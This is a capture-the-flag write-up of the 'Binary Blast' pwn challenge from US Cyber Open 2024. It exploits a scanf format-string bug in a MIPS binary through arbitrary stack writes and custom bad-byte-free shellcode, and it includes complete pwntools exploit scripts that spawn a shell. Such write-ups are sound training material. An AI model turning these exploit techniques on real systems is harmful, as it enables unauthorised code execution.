@@ -1,0 +1,283 @@
+---
+title: 'US Cyber Open 2024: Binary Blast Writeup'
+date: '2024-08-02'
+tags: ['writeups', 'pwn']
+draft: false
+summary: 'Writeup of the Binary Blast challenge from the US Cyber Open CTF 2024 made for the US Cyber Combine.'
+---
+
+<TOCInline toc={props.toc} asDisclosure toHeading={2} />
+
+## Binary Blast
+**Challenge Author:** LMS
+**Challenge Description:** Ready for a blast from the past? Navigate the MIPS landscape and watch out for those sneaky format strings. Beware of fake flags—only the real one will do!
+
+***
+
+In this challenge, we are provided multiple files zipped together. These include `Dockerfile`, `chall`, `flag`, `lib/ld.so.1`, `lib/libc.so.6`, `libcapstone.so.4`, `libglib-2.0.so.0`, `qemu-mips`, and `ynetd`. Wow that's a lot! However, most of these are used to simply help setup the docker environment. We will be most interested in the binary itself that is running which is `chall`. Let's run the file command on it.
+
+![image](https://hackmd.io/_uploads/rJ6U1nttR.png)
+
+We see that it is a very non-standard format. We will be dealing with 32-bit MIPS architecture. Before this challenge, I was not very familiar with this architecture, so I researched it a bit. It seems to be an older family of RISC architectures which are often used in hardware. This now makes sense why there are so many setup files as we will have to be emulating MIPS with qemu. Now let's run checksec!
+
+![image](https://hackmd.io/_uploads/HyLtxhttR.png)
+
+Wow this looks very promising! No RELRO means we will be able to easily overwrite got entries with a buffer overflow, no canary means we can have buffer overflows on the stack, NX unknown means we will have to investigate later, and there are RWX sections for us to write and execute our own shellcode in. Though PIE is present, so we will probably need leaks. Now let's see what this binary is doing in Binja.
+
+There seem to be three functions important to us: `main`, `winner`, and `custom_start_function`. `custom_start_function` is what will be executed first, so let's check it out.
+
+![image](https://hackmd.io/_uploads/r1fVb3FFR.png)
+
+The function is very simple. It prints a message, reads in 20 bytes from the user, and calls main with our input as an argument. 20 bytes is not enough to overflow anything or trigger any vulnerabilities, so let's see what it's doing with our input in main!
+
+![image](https://hackmd.io/_uploads/Byx5W3tYA.png)
+
+Main is even simpler, calling scanf and passing our input as the format argument. This is where the vulnerability lies! Scanf is called and we control the format which will surely lead to format string vulnerabilities. 
+
+In the past, I had done many pwn challenges with format string vulnerabilites that used printf incorrectly. This allows the user to leak values with different format specifiers such as `%p` and then write data with `%n`. But here we have scanf... One thing I do know about scanf is that if used with the `%s` format specifier, it will read in an unrestricted number of bytes similar to a `gets` call. Let's try that first!
+
+![image](https://hackmd.io/_uploads/rkRoqnYtC.png)
+
+Hmm, unfortunately we don't get much feedback from the program. Let's see what's happening in gdb! To setup debugging for this challenge I used this resource as a reference: https://debugmen.dev/ctf-writeup/2021/06/05/babyarmrop.html. It is actually written by one of our mentors Chris Issing! The article explains setting up debugging for an ARM challenge, but all the same principles apply here.
+
+To run the program normally we execute `./qemu-mips -L . chall`. Now to debug, we will add an additional flag which makes the command `./qemu-mips -L . -g 1234 chall`. This will pause execution of the program and wait for a debugger to attach on port 1234. Now, in a second terminal we can run `gdb-multiarch chall` and as a first command in gdb send `target remote :1234`.
+
+![image](https://hackmd.io/_uploads/ryRRj3KF0.png)
+
+Program pausing for a debugger connection.
+
+![image](https://hackmd.io/_uploads/S1Rl3nKYA.png)
+
+GDB starting in another terminal window.
+
+![image](https://hackmd.io/_uploads/ryy4nntFA.png)
+
+GDB successfully connecting and allowing us to step through.
+
+Awesome, now we have a debugging setup! Let's break on main and step through the scanf call to see what happens when we send `%s` and many A's as the scanf input.
+
+![image](https://hackmd.io/_uploads/r1iw2hYY0.png)
+
+So, when scanf is called A0 (the first register in MIPS) stores our controlled input which is currently `%s\n`. A1, the second register which our input will be stored in has the value `0x2b2ab204`. Now we see that sending hundreds of A's won't do anything.
+
+![image](https://hackmd.io/_uploads/SJ7E63YF0.png)
+
+In GDB, we can see main will return to `0x2b3105c4` which is being stored at the stack address `0x2b2ab0ec`. If our A's are being stored at `0x2b2ab204`, they will never be able to reach the return address as we will only write values to higher stack addresses while the return address is lower. Time to try more complicated format strings!
+
+My next idea was to try using positional arguments. I knew from printf challenges that a payload such as `%4$p` would print the 4th argument to printf rather than the first. So, the value of the `r8` register would be printed instead of `rsi` (in the case of x86_64). Perhaps the same principle applies to scanf!
+
+![image](https://hackmd.io/_uploads/r1kG1ptFC.png)
+
+I ran it again and looked at the registers when scanf is called. A1 is still the same value of `0x2b2ab204` which is where our input was stored last time. Now if we use the format of `%2$s`, our input should land in the next argument A2 which has the value `0x2b2ab20c`.
+
+![image](https://hackmd.io/_uploads/Hy_31TKYC.png)
+
+Success! Our A's are being stored at the second register! This is good news as now we can write to any addresses stored on the stack. This is because once printf and scanf run out of positional arguments from registers they will begin taking them off the stack. Let's see what potential places we can write to!
+
+![image](https://hackmd.io/_uploads/rJ7M-aKYR.png)
+
+Hmm we have a lot of different options, but we run into the same problem. All of the stack addresses we can write to are higher on the stack than the return address, so we still can't overwrite it to redirect execution. It's time to get a more powerful primitive, arbitrary write!
+
+To do this we will need a pointer chain. The idea is we would find a stack address A that points to another stack address B. So on the stack this would look like `A -> B -> some value`. Now, both A and B would have to be accessible using format specifiers. This way, our first format specifier would be `%A$s`, where A is the index that allows us to write values to the pointer stored in A. Then, we would send our target address. Now the stack would look like `A -> B -> target`. Next, because B was also accessible as a format specifier, we can send the second part of our payload, `%B$s` and our input would now be stored in target thus achieving arbitrary write! The stack would then look something like:
+`A -> B -> target -> payload`
+
+Now this was easier said than done. The first step was to find our pointer chain. I ended up using this one: 
+
+![image](https://hackmd.io/_uploads/HknZNptYR.png)
+
+Our A would be `0x2b2ab114` and our B would be `0x2b2ab0f0`. Next, we had to find the values that we would use to access these pointers with our positional arguments. To do this, I simply used trial and error with multiple positional arguments and saw where they were being stored.
+
+![image](https://hackmd.io/_uploads/r10gHaKtR.png)
+
+The payload of `%4$s` stored our input at the address in `0x2b2ab0e0` and each consecutive positional argument would increment by 4 bytes on the stack. Mapping this out got our values of A to be 17 which would write to `0x2b2ab0f0` and then B was 8 which would write to whatever address was being stored at `0x2b2ab0f0`. Let's try it out.
+
+However, to test this, we would need a proper script setup to send addresses through the connection. For this, I decided to start testing on the docker. I modified the Dockerfile to add the `-g 1234` flag, so we can debug it. I also wrote a file `gdbscript` with the following contents:
+```
+target remote :1234
+b main
+c
+```
+This would immediately land us in a breakpoint at main, by simply running `gdb-multiarch chall -x gdbscript` in another terminal window after our connection. I then wrote the following script:
+
+```python=
+from pwn import *
+import time
+
+elf = ELF("./chall")
+libc = ELF("./lib/libc.so.6")
+ld = ELF("./lib/ld.so.1")
+context.binary = elf
+
+def conn():
+    if args.GDB:
+        script = """
+        b main
+        c
+        """
+        p = gdb.debug(elf.path, gdbscript=script)
+    elif args.REMOTE:
+        p = remote("0.cloud.chals.io", 12490)
+    else:
+        p = remote("0.0.0.0", 1024)
+    return p
+
+def run():
+    global p
+    p = conn()
+
+    p.sendafter(b'string: ', b'%17$s%8$s')
+    time.sleep(1)
+    p.sendline(p32(0x2b2abdec))
+    p.sendline(b'BBBB')
+
+    p.interactive()
+
+run()
+```
+
+This would connect to 0.0.0.0 port 1024 (where the docker was running), send our format string payload, wait 1 second, send our target address (in this case 0x2b2abdec which was the location of the return address in the docker), and then our payload. If all goes well this would overwrite the current return address with 4 B's. Let's see!
+
+![image](https://hackmd.io/_uploads/HkRLDattA.png)
+
+Success! We step through to where main returns and we see it trying to return to 0x42424242. Now the question is where should we jump...
+
+![image](https://hackmd.io/_uploads/S1bADaKKA.png)
+
+The last function that we didn't look at in the binary was `winner`. It requires many arguments to be set and then would print the flag. However, although this would be possible with a lot of ROPing it would be very difficult. Also, the challenge description says "Beware of fake flags—only the real one will do!". Maybe we should just get a shell instead! The question is how...
+
+![image](https://hackmd.io/_uploads/S1vdOTtKA.png)
+
+Unfortunately, as in other challenges, we can't simply jump to a one_gadget as it will not work in mips. However, thinking back to our checksec ouptut there are RWX sections and the NX bit is unknown, so it may be possible to write and execute shellcode on the stack! This is promising, but we still have one thing missing... leaks. 
+
+If we try to write shellcode on the stack, we will need to know where it is stored in order to properly jump to it. Luckily, qemu is on our side! I noticed when I ran the docker multiple times all the addresses would remain the same, no matter when or from what machine I ran it. As long as I debugged in the docker and used addresses from there, they would be the same as remote! Now we just need to find a place to write shellcode and jump to it.
+
+![image](https://hackmd.io/_uploads/SJ9_K15YC.png)
+
+The thing is, we already control everything past address `0x2b2abdec`. The first 4 bytes store the address which we will jump to, but because `%s` has no bounds checking in scanf we can keep writing bytes. These bytes can become our shellcode. So, now we just set the return address to `0x2b2abdf0`, 4 bytes past where it is being stored, and as a payload send `0x2b2abdec` followed by our shellcode. I updated my script to the following:
+
+```python
+p = conn()
+
+p.sendafter(b'string: ', b'%17$s%8$s')
+time.sleep(1)
+# target address
+p.sendline(p32(0x2b2abdec))
+payload = shellcraft.sh()
+# return address + payload
+p.sendline(p32(0x2b2abdf0) + asm(payload))
+
+p.interactive()
+```
+
+Luckily, pwntools has support for MIPS, so shellcraft will work well. Let's run it!
+
+![image](https://hackmd.io/_uploads/H1Ft5y5FR.png)
+
+![image](https://hackmd.io/_uploads/HJ8591qKA.png)
+
+Hmm, the instruction `lui $zero, 0xbdec` was written correctly and seems to execute well without a segfault. This means we can execute code on the stack! However, there should be many more instructions as a part of shellcraft.sh(), so what went wrong...
+
+The entire shellcraft payload printed out is: ```<\t//5)bi\xaf\xa9\xff\xf4<\tn/5)sh\xaf\xa9\xff\xf8\xaf\xa0\xff\xfc'\xbd\xff\xf4\x03\xa0<\x19\x8c\x9779\xff\xff\x03H'\xaf\xa9\xff\xfc'\xbd\xff\xfc(\x05\xff\xff\xaf\xa5\xff\xfc#\xbd\xff\xfc$\x19\xff\xfb\x03('\x03\xa5(\xaf\xa5\xff\xfc#\xbd\xff\xfc\x03\xa0(\xaf\xa0\xff\xfc'\xbd\xff\xfc(\x06\xff\xff\xaf\xa6\xff\xfc#\xbd\xff\xfc\x03\xa004\x02\x0f\xab\x01\x01\x01\x0c```
+
+Yet when we see what's written at `0x2b2abdf0` we see:
+
+![image](https://hackmd.io/_uploads/BJUPi15tC.png)
+
+Only the first byte `<` (0x3c in hex) was written, and then there is a null byte. After some trial and error, I found that scanf with `%s` doesn't read all bytes. Certain bytes, especially those lower in the ascii range were not read properly. If these bytes were encountered, it would stop reading and write a null byte. This wasn't good, manually writing MIPS shellcode that spawned a shell and didn't use any disallowed bytes would take a lot of time. But there was an alternative!
+
+Instead of writing shellcode to spawn a shell, we could write shorter shellcode that would execute the read syscall. This would allow us to send an additional payload that could have any bytes we wanted in it. Time to read about MIPS syscalls!
+
+![image](https://hackmd.io/_uploads/SJWp0y9KR.png)
+
+![image](https://hackmd.io/_uploads/S1Tbyx5tR.png)
+
+So to execute a syscall in MIPS we put the syscall number in $v0, all the arguments in $a0, $a1, ... and then execute the syscall instruction. To do this with read, we must use syscall number 4003 or 0xfa3 in hex. Now, let's write some shellcode!
+
+```asm=
+lui $v0, 0x0
+ori $v0, 4003
+lui $a0, 0x0
+ori $a0, 0x0
+lui $a1, 0xdead
+ori $a1, 0xbeef
+lui $a2, 0x0
+ori $a2, 0x100
+syscall
+```
+
+After reading about some basic MIPS instructions, this seemed to load all the values needed for the read syscall, where the fd is 0 (stdin), the values are read into address 0xdeadbeef, and 0x100 characters are read. Let's try it!
+
+![image](https://hackmd.io/_uploads/HkLM0xqYR.png)
+
+Almost! All of the instructions are there except for syscall. It turns out the byte representation of syscall is `\x00\x00\x00\x0c` and 0xc is one of the characters that stdin will not read. To get around this, I used an alternative version of the syscall instruction. Instead of using just `syscall` we can do it followed by a number, so `syscall 1`. This will change the bytes of the instruction to be valid and still execute the syscall!
+
+![image](https://hackmd.io/_uploads/SklEVZctA.png)
+
+Now it works! We can trigger the read syscall and read to anywhere we'd like. Now the question is where? But this is simple! We can simply read the bytes into the very next instruction that will be executed which is `0x2b2abe14`. I updated the full script to now look like this:
+
+```python=
+from pwn import *
+import time
+
+elf = ELF("./chall",checksec=0)
+libc = ELF("./lib/libc.so.6",checksec=0)
+ld = ELF("./lib/ld.so.1",checksec=0)
+context.binary = elf
+
+def conn():
+    if args.GDB:
+        script = """
+        b main
+        c
+        """
+        p = gdb.debug(elf.path, gdbscript=script)
+    elif args.REMOTE:
+        p = remote("0.cloud.chals.io", 12490)
+    else:
+        p = remote("0.0.0.0", 1024)
+    return p
+
+def run():
+    payload = '''
+    lui $v0, 0x0
+    ori $v0, 4003
+    lui $a0, 0x0
+    ori $a0, 0x0
+    lui $a1, 0x2b2a
+    ori $a1, 0xbe14
+    lui $a2, 0x0
+    ori $a2, 0x100
+    syscall 1
+    '''
+    payload = asm(payload)
+
+    global p
+    p = conn()
+
+    p.sendafter(b'string: ', b'%17$s%8$s')
+    time.sleep(1)
+    p.sendline(p32(0x2b2abdec))
+    p.sendline(p32(0x2b2abdf0) + payload)
+    time.sleep(1)
+    p.sendline(asm(shellcraft.sh()))
+
+    p.interactive()
+
+run()
+```
+
+Running this on the docker gets a shell! Let's try remote!
+
+![image](https://hackmd.io/_uploads/HyblLW9tC.png)
+
+We got a shell! Reading flag.txt we see:
+
+![image](https://hackmd.io/_uploads/HkrbU-5KC.png)
+
+Ah this must be the fake flag we were warned about. But no worries we have a shell we can look for the "real flag".
+
+![image](https://hackmd.io/_uploads/Hyu4IW9FA.png)
+
+We are greeted with the real flag in the root directory! It references the lack of ASLR and NX caused by qemu which made our exploit much simpler.
+
+### Flag: `SIVUSCG{Seems_That_QEMU_Is_Missing_Protections}`
